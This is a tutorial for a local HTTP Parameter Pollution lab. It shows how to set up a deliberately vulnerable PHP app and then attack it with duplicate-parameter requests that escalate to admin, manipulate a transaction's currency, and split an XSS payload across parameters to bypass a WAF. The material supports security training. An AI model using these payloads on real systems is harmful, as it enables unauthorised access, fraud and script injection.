### **Setting Up the HTTP Parameter Pollution (HPP) Lab**  

This guide will help you **host, test, and exploit** the vulnerable PHP web app.  

---

## **1️. Install Required Tools**  

### **For Local Setup:**  
>> Install **PHP** (if not installed)  
   - Linux (Debian/Ubuntu):  
     ```bash
     sudo apt update && sudo apt install php -y
     ```
   - Windows: Download PHP from [php.net](https://www.php.net/downloads)  
   - macOS (Homebrew):  
     ```bash
     brew install php
     ```

>> Install **Burp Suite/ZAP Proxy** (for modifying HTTP requests)  
   - Download **Burp Suite Community Edition** from: [PortSwigger](https://portswigger.net/burp/communitydownload)  
   - Download **OWASP ZAP** from: [ZAP Website](https://www.zaproxy.org/download/)  

---

## **2️. Set Up the Vulnerable PHP App**  

1️) **Create a New Directory & Place the File**  
   ```bash
   mkdir hpp_lab && cd hpp_lab
   nano hpp_lab.php
   ```
   - Copy & paste the **vulnerable PHP code** (from the canvas).  
   - Save (`CTRL+X`, then `Y`, then `Enter`).  

2️) **Start the PHP Server**  
   ```bash
   php -S 0.0.0.0:8000
   ```
   - This runs the server on **http://localhost:8000**.  
   - Open a browser and go to **http://localhost:8000/hpp_lab.php**.  

---

## **3️. Exploiting HTTP Parameter Pollution (HPP)**  

### ** Client-Side HPP Attack (Bypassing Login)**  
1️) Open your browser and visit:  
   ```
   http://localhost:8000/hpp_lab.php?user=attacker&role=user&role=admin
   ```
2️) If the app **does not properly handle multiple role parameters**, it may give **admin access** instead of user access.  

---

### ** Server-Side HPP Attack (Transaction Manipulation)**  
1️) Open **Burp Suite** or **ZAP Proxy** and intercept a **POST request**:  
   ```plaintext
   POST /hpp_lab.php HTTP/1.1
   Host: localhost:8000
   Content-Type: application/x-www-form-urlencoded

   amount=1000&currency=USD&currency=INR
   ```
2️) Modify the `currency` parameter to have multiple values (`USD` and `INR`).  
3️) If the application does not handle duplicates properly, it may:  
   - Process **both currencies** incorrectly.  
   - Allow **currency manipulation** (e.g., sending **USD but processing INR**).  

---

## **4️. Additional Exploits**  
 **Bypass Web Application Firewalls (WAFs)**  
   - Some WAFs block `q=<script>alert(1)</script>`, but you can try:  
     ```
     http://localhost:8000/hpp_lab.php?q=<script>&q=alert(1)</script>
     ```
     - If WAF checks only the first `q`, this may trigger XSS.  

 **Modify API Behavior**  
   - Test an API endpoint with duplicate parameters:  
     ```
     http://localhost:8000/api/transfer?amount=5000&currency=USD&currency=INR
     ```
   - If vulnerable, it may incorrectly process **USD instead of INR**.  

---


